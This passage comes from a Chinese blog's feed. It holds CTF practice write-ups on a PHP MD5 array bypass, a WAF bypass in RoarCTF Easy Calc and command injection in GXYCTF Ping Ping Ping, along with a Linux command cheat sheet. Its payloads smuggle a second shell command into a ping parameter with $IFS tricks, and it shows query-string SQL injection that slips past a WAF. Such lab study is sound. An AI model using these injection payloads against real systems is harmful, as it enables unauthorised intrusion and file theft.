class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post方法传参，要求param1 和  param2 类型不同，但MD5后的值和类型都相同！2中的方法没办法通过。</p><p>因为md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><p>所以直接POST传入param1[]=1&amp;param2[]=2即可得到，可使用hackbar插件，google和firefox里都有。</p><p>参考php的一些特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">array</span>()) = <span class="literal">null</span>    </span><br><span class="line">ereg(pattern,<span class="keyword">array</span>()) = <span class="literal">null</span> vs preg_match(pattern,<span class="keyword">array</span>) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">引用自 https:<span class="comment">//blog.csdn.net/q1352483315/article/details/89469928</span></span><br></pre></td></tr></table></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>今天这两道ctf题主要考察点是，php反序列化漏洞（wakeup()方法的绕过），sql注入的基本原理，get,post方法传参，以及MD5函数特性，数组绕过等，两道题只是简单的入门了解，后面还需继续加深才是！</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/3674#toc-5">https://xz.aliyun.com/t/3674#toc-5</a></p><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">https://www.cnblogs.com/yesec/p/12535534.html</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/104522626">https://blog.csdn.net/qq_42967398/article/details/104522626</a></p><p><a href="https://segmentfault.com/a/1190000022534926">https://segmentfault.com/a/1190000022534926</a></p><p><a href="https://blog.csdn.net/q1352483315/article/details/89469928">https://blog.csdn.net/q1352483315/article/details/89469928</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;PHP反序列化，MD5绕过学习&quot;&gt;&lt;a href=&quot;#PHP反序列化，MD5绕过学习&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化，MD5绕过学习&quot;&gt;&lt;/a&gt;PHP反序列化，MD5绕过学习&lt;/h4&gt;&lt;p&gt;学习过程是通过刷题，来源：&lt;a hr</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux Command</title>
    <link href="http://example.com/2020/11/23/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2020/11/23/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2020-11-23T13:41:10.000Z</published>
    <updated>2020-12-10T12:43:28.663Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h3><h5 id="1-文件命令"><a href="#1-文件命令" class="headerlink" title="1.文件命令"></a>1.文件命令</h5><p><code>ls</code>  -列出目录</p><p><code>ls -al </code> -使用格式化列出隐藏文件</p><p><code>cd dir</code> 更改目录到dir</p><p><code>cd</code> -更改目录到home</p><p><code>pwd</code> -显示当前目录</p><p><code>mkdir dir</code> – 创建目录 dir</p><p><code>rm file</code> – 删除 file </p><p><code>rm -r dir</code> – 删除目录 dir </p><p><code>rm -f file</code> – 强制删除 file </p><p><code>rm -rf dir</code> – 强制删除目录 dir * </p><p><code>cp file1 file2</code> – 将 file1 复制到 file2 </p><p><code>cp -r dir1 dir2</code> – 将 dir1 复制到 dir2; 如果 dir2 不存 在则创建它 </p><p><code>mv file1 file2</code> – 将 file1 重命名或移动到 file2; 如果 file2 是一个存在的目录则将 file1 移动到目录 file2 中 </p><p><code>ln -s file link</code> – 创建 file 的符号连接 link </p><p><code>touch file</code> – 创建 file </p><p><code>cat &gt; file</code> – 将标准输入添加到 file </p><p><code>more file</code> – 查看 file 的内容 </p><p><code>head file</code> – 查看 file 的前 10 行 </p><p><code>tail file</code> – 查看 file 的后 10 行 </p><p><code>tail -f file</code> – 从后 10 行开始查看 file 的内容</p><h5 id="2-进程管理"><a href="#2-进程管理" class="headerlink" title="2.进程管理"></a>2.进程管理</h5><p><code>ps</code> – 显示当前的活动进程 </p><p><code>top</code> – 显示所有正在运行的进程</p><p><code>kill pid</code> – 杀掉进程 id pid </p><p><code>killall proc</code> – 杀掉所有名为 proc 的进程 * </p><p><code>bg</code> – 列出已停止或后台的作业 </p><p><code>fg</code> – 将最近的作业带到前台 </p><p><code>fg n</code> – 将作业 n 带到前台</p><h5 id="3-文件权限"><a href="#3-文件权限" class="headerlink" title="3.文件权限"></a>3.文件权限</h5><p><code>chmod octal file</code> – 更改 file 的权限 </p><p><code>● 4 – 读 (r)</code> </p><p><code>● 2 – 写 (w)</code> </p><p><code>● 1 – 执行 (x)</code> </p><p>示例: </p><p><code>chmod 777 – 为所有用户添加读、写、执行权限</code> </p><p><code>chmod 755 – 为所有者添加 rwx 权限, 为组和其他用户添加 rx 权限.</code></p><h5 id="4-SSH"><a href="#4-SSH" class="headerlink" title="4.SSH"></a>4.SSH</h5><p><code>ssh user@host</code> – 以 user 用户身份连接到 host </p><p><code>ssh -p port user@host</code> – 在端口 port 以 user 用户身份连接到 host </p><p><code>ssh-copy-id user@host</code> – 将密钥添加到 host 以实现无密码登录</p><h5 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5.搜索"></a>5.搜索</h5><p><code>grep pattern files</code> – 搜索 files 中匹配 pattern 的内容</p><p><code>grep -r pattern dir</code> – 递归搜索 dir 中匹配 pattern 的 内容 </p><p><code>command | grep pattern</code> – 搜索 command 输出中匹配 pattern 的内容</p><p><code>date</code> – 显示当前日期和时间 </p><p><code>cal</code> – 显示当月的日历 </p><p><code>uptime</code> – 显示系统从开机到现在所运行的时间 </p><p><code>w</code> – 显示登录的用户 </p><p><code>whoami</code> – 查看你的当前用户名 </p><p><code>finger user</code> – 显示 user 的相关信息 </p><p><code>uname -a</code> – 显示内核信息 </p><p><code>cat /proc/cpuinfo</code> – 查看 cpu 信息 </p><p><code>cat /proc/meminfo</code> – 查看内存信息 </p><p><code>man command</code> – 显示 command 的说明手册 </p><p><code>df</code> – 显示磁盘占用情况 </p><p><code>du</code> – 显示目录空间占用情况 </p><p><code>free</code> – 显示内存及交换区占用情况</p><h5 id="6-压缩"><a href="#6-压缩" class="headerlink" title="6.压缩"></a>6.压缩</h5><p><code>tar cf file.tar files</code> – 创建包含 files 的 tar 文件 </p><p><code>file.tar tar xf file.tar</code> – 从 file.tar 提取文件 </p><p><code>tar czf file.tar.gz files</code> – 使用 Gzip 压缩创建 tar 文件 </p><p><code>tar xzf file.tar.gz</code> – 使用 Gzip 提取 tar 文件 </p><p><code>tar cjf file.tar.bz2</code> – 使用 Bzip2 压缩创建 tar 文件 </p><p><code>tar xjf file.tar.bz2</code> – 使用 Bzip2 提取 tar 文件 </p><p><code>gzip file</code> – 压缩 file 并重命名为 file.gz </p><p><code>gzip -d file.gz</code> – 将 file.gz 解压缩为 file</p><h5 id="7-网络"><a href="#7-网络" class="headerlink" title="7.网络"></a>7.网络</h5><p><code>ping host – ping host</code> 并输出结果 </p><p><code>whois domain</code> – 获取 domain 的 whois 信息 </p><p><code>dig domain</code> – 获取 domain 的 DNS 信息 </p><p><code>dig -x host</code> – 逆向查询 host </p><p><code>wget file</code> – 下载 file </p><p><code>wget -c file</code> – 断点续传</p><h5 id="8-快捷键"><a href="#8-快捷键" class="headerlink" title="8.快捷键"></a>8.快捷键</h5><p><code>Ctrl+C</code> – 停止当前命令 </p><p><code>Ctrl+Z</code> – 停止当前命令，并使用 fg 恢复 </p><p><code>Ctrl+D</code> – 注销当前会话，与 exit 相似 </p><p><code>Ctrl+W</code> – 删除当前行中的字 </p><p><code>Ctrl+U</code> – 删除整行 </p><p><code>!!</code> - 重复上次的命令 </p><p><code>exit</code> – 注销当前会话</p><p><code>Ctrl+Shift+C</code> -复制选中内容</p><p><code>Ctrl+Shift+V 或 Shift+ins 或单击鼠标滚轮</code>  -粘贴已选内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Linux常用命令&quot;&gt;&lt;a href=&quot;#Linux常用命令&quot; class=&quot;headerlink&quot; title=&quot;Linux常用命令&quot;&gt;&lt;/a&gt;Linux常用命令&lt;/h3&gt;&lt;h5 id=&quot;1-文件命令&quot;&gt;&lt;a href=&quot;#1-文件命令&quot; class=&quot;head</summary>
      
    
    
    
    <category term="OS" scheme="http://example.com/categories/OS/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题</title>
    <link href="http://example.com/2020/11/21/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/11/21/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-21T03:41:10.000Z</published>
    <updated>2020-12-10T12:42:25.497Z</updated>
    
    <content type="html"><![CDATA[<h4 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h4><h5 id="1-RoarCTF-2019-Easy-Calc"><a href="#1-RoarCTF-2019-Easy-Calc" class="headerlink" title="1.[RoarCTF 2019]Easy Calc"></a>1.[RoarCTF 2019]Easy Calc</h5><p>有waf，基本思路就想到过waf，危险函数传参。</p><p>源代码中发现有calc.php的页面：</p><p> 在url后添加“calc.php”访问，php代码审计：</p><p>接收的参数为num，看到过滤规则首个就是过滤空格</p><p>构造如下：calc.php?空格num=phpinfo(); 这样，会先触发规则，删除空格，进而将一个名称为num的参数传入</p><p>成功</p><p>进一步读取目录，否则仍是找不到flag</p><p>由于过滤了“/”符号，我们用ASCII码替换</p><p>补充：</p><p>​     scandir() 函数返回指定目录中的文件和目录的数组。</p><p>​     var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，      通过缩进显示其结构。</p><p>f1agg字符串，file_get_contents()直接读取即可。</p><p>php的字符串运算符示例：</p><p><code>&lt;?php      $a=&#39;this is a test&#39;;     $a.=chr(78).chr(98);     echo $a;      ?&gt;</code></p><p>有两个字符串运算符，连接运算符为’ . ‘, 其返回左右两参数的拼接结果， 连接赋值运算符为 ‘ .= ‘，其是将运算符右侧参数拼接到左侧参数（string）的后面。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>题目比较简单，主要考察对于php字符串的解析特性</p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><p>/news.php?%20news[id%00=42”+AND+1=0–</p><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><h5 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h5><p>这个题是Ping命令注入</p><p>传参：?ip=localhost|ls</p><p>| (管道符号)的作用是将| 的作用是将前一个命令的结果传递给后一个命令作为输入；</p><p>ls(list files)：列出当前目录下子目录及所含文件</p><p>继续传参：?ip=localhost|cat%20index.php</p><p>可以看出过滤了空格，尝试绕过，绕过空格的思路一般有：</p><p><code>$IFS</code>,<code>IFS的默认值为：空白（包括：空格，tab, 和新行)</code></p><p><code>$&#123;IFS&#125;，&lt;，&lt;&gt;,</code></p><p> <code>&#123;cat,flag.php&#125; //用逗号实现了空格功能,%20,%09</code></p><p>``$IFS$1`   //$1改成$加其他数字貌似都行</p><p>可以看到对我们的输入进行了过滤，在flag匹配里面不能将flag连写，同时覆盖$a变量</p><p>变量拼接:    ?ip=localhost;a=g;cat$IFS$1fla$a.php;</p><p>查看源代码里面就有flag</p><p>除此外，我们可以尝试使用反引号内联执行的做法，linux下反引号``里面包含的就是需要执行的系统命令</p><p>反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令</p><p>查看源代码可以看到index.php和flag.php的内容全部显示。</p><h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>主要考察命令注入的常见绕过姿势，及php语法规则。</p><p><a href="https://xz.aliyun.com/t/3918">https://xz.aliyun.com/t/3918</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html#autoid-0-0-0">https://www.cnblogs.com/wangtanzhi/p/12246386.html#autoid-0-0-0</a></p><p><a href="https://www.cnblogs.com/Cl0ud/p/12313368.html">https://www.cnblogs.com/Cl0ud/p/12313368.html</a></p><p><a href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;BUUCTF刷题记录&quot;&gt;&lt;a href=&quot;#BUUCTF刷题记录&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF刷题记录&quot;&gt;&lt;/a&gt;BUUCTF刷题记录&lt;/h4&gt;&lt;h5 id=&quot;1-RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
